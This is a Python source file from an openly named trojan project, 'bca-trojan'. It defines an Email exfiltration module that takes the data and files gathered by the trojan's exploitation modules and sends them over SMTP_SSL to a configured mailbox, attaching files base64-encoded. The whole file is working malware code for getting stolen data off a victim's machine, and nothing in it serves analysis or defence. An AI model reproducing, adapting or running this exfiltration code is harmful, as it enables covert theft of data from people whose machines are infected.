#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path

from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule


class Email(ExfiltrationModule):
    def __init__(self, *,
                 module: ExploitationModule,
                 smtp_host: str,
                 smtp_port: int,
                 email: str,
                 password: str):
        super().__init__(module)
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email = email
        self.password = password

    def attach_file(self, file: Path) -> str:
        message = MIMEMultipart()
        message['From'] = self.email
        message['To'] = self.email
        message['Subject'] = self.module.tag

        with open(file=file, mode="rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header("Content-Disposition",
                        f"attachment; filename={file}")
        message.attach(part)
        return message.as_string()

    def update(self, message: [str, Path]) -> None:
        """Send each report as an email with or without an attachment
        through a secure connection using SMTP."""
        if self.module.has_data is True:
            with smtplib.SMTP_SSL(
                    host=self.smtp_host,
                    port=self.smtp_port,
                    context=ssl.create_default_context()
            ) as server:
                server.login(user=self.email, password=self.password)
                if isinstance(message, str):     # Text-only
                    message = f"Subject:{self.module.tag}\n\n{message}"
                elif isinstance(message, Path):  # With attachment
                    message = self.attach_file(file=message)
                else:
                    raise TypeError("Operation not supported for this type of "
                                    "message.")
                server.sendmail(from_addr=self.email,
                                to_addrs=self.email,
                                msg=message)
